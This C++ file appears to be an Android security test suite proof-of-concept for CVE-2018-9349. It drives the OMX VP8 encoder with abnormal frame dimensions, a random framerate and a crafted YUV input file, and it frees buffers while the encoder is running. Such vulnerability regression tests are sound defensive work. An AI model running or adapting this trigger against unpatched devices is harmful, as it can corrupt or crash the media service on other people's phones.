/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <OMX_Component.h>
#include <OMX_QCOMExtns.h>
#include <android/hardware/media/omx/1.0/IOmx.h>
#include <android/hidl/manager/1.0/IServiceManager.h>
#include <binder/Binder.h>
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryBase.h>
#include <binder/MemoryDealer.h>
#include <binder/MemoryHeapBase.h>
#include <binder/ProcessState.h>
#include <hidl/HidlBinderSupport.h>
#include <hidl/ServiceManagement.h>
#include <hwbinder/Binder.h>
#include <hwbinder/IInterface.h>
#include <hwbinder/Parcel.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <media/OMXBuffer.h>
#include <media/hardware/HardwareAPI.h>
#include <media/omx/1.0/WOmx.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "../includes/common.h"

#include <iostream>
using namespace std;
using namespace android;

class FileReader {
 public:
  FileReader() {}

  int setup(const char *fileName) {
    mFileName = fileName;

    mFd = open(mFileName, O_RDONLY);
    if (mFd < 0) {
      return -1;
    }

    struct stat st;
    if (fstat(mFd, &st) < 0) {
      return -1;
    }
    mFileSize = st.st_size;

    mFileBuf = (unsigned char *)malloc(mFileSize);
    if (mFileBuf == NULL) {
      return -1;
    }

    return 0;
  }

  ~FileReader() {
    close(mFd);
    if (mFileBuf != NULL) free(mFileBuf);
  }

  void read(void *buf, int len) { ::read(mFd, buf, len); }

 private:
  const char *mFileName;
  int mFd;
  int mFileSize;
  unsigned char *mFileBuf;
};

template <class T>
static void InitOMXParams(T *params) {
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages) {
    if (messages.empty()) {
      return;
    }
  }

 protected:
  virtual ~DummyOMXObserver() {}
};

static bool connectOMX(sp<IOMX> &omx) {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == NULL) {
    return false;
  }

  omx = mediaPlayerService->getOMX();
  if (omx == NULL) {
    return false;
  }

  return true;
}

static int poc(const char *yuvFile) {
  FileReader fr;
  int ret = fr.setup(yuvFile);
  if (ret < 0) {
    return false;
  }

  sp<IOMX> omx;
  if (connectOMX(omx) == false) {
    return false;
  }

  status_t err;
  sp<IOMXNode> node;
  sp<DummyOMXObserver> observer = new DummyOMXObserver();
  const char *codecName = "OMX.google.vp8.encoder";
  err = omx->allocateNode(codecName, observer, &node);
  if (err != OK || node == NULL) {
    return false;
  }

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = 0;
  OMX_INDEXTYPE omx_indextype = OMX_IndexParamPortDefinition;
  err = node->getParameter(omx_indextype, &def, sizeof(def));
  if (err != OK) {
    return false;
  }

  def.format.video.nFrameWidth = 4261;
  def.format.video.nFrameHeight = 4547;
  def.format.video.xFramerate = random();
  err = node->setParameter(omx_indextype, &def, sizeof(def));
  if (err != OK) {
    return false;
  }
  err = node->getParameter(omx_indextype, &def, sizeof(def));
  if (err != OK) {
    return false;
  }

  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;

  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];

  InitOMXParams(&def);
  def.nPortIndex = 1;
  err = node->getParameter(OMX_IndexParamPortDefinition, &def, sizeof(def));
  if (err != OK) {
    return false;
  }

  int outMemSize = def.nBufferCountActual * def.nBufferSize;
  int outBufferCnt = def.nBufferCountActual;
  int outBufferSize = outMemSize / outBufferCnt;

  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  err = node->sendCommand(OMX_CommandStateSet, OMX_StateIdle);
  if (err != OK) {
    return false;
  }

  cout << "allocating" << endl;
  Vector<sp<IMemory>> inIMemoryVector;
  Vector<sp<IMemory>> outIMemoryVector;

  int len[] = {749554, 33480, 4327, 19066967};
  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);

    fr.read(memory->pointer(), inBufferSize > len[i] ? len[i] : inBufferSize);

    inIMemoryVector.push_back(memory);

    OMXBuffer omxBuf(memory);
    err = node->useBuffer(0, omxBuf, &inBufferId[i]);
  }

  for (int i = 0; i < outBufferCnt; i++) {
    sp<IMemory> memory = dealerOut->allocate(outBufferSize);
    outIMemoryVector.push_back(memory);
    OMXBuffer omxBuf(memory);
    err = node->useBuffer(1, omxBuf, &outBufferId[i]);
  }

  err = node->sendCommand(OMX_CommandStateSet, OMX_StateExecuting);
  if (err != OK) {
    return false;
  }

  int fenceFd = -1;
  for (int i = 0; i < inBufferCnt; i++) {
    OMXBuffer omxBuf(0, inBufferSize);
    err = node->emptyBuffer(inBufferId[i], omxBuf, 0, 0, fenceFd);
    dealerIn->deallocate(inIMemoryVector.top()->offset());
    inIMemoryVector.pop();
  }

  for (int i = 0; i < outBufferCnt; i++) {
    OMXBuffer omxBuf(0, outBufferSize);
    err = node->fillBuffer(outBufferId[i], omxBuf, fenceFd);
    dealerOut->deallocate(outIMemoryVector.top()->offset());
    outIMemoryVector.pop();
  }

  node->freeNode();
  cout << "deallocating" << endl;
  return true;
}

int main() {
  time_t test_started = start_timer();
  android::ProcessState::self()->startThreadPool();
  const char *pocname = "/data/local/tmp/CVE-2018-9349.yuv";
  while (timer_active(test_started)) {
    if (poc(pocname) == false) {
      return EXIT_FAILURE;
    }
    sleep(1);
  }
  return EXIT_SUCCESS;
}
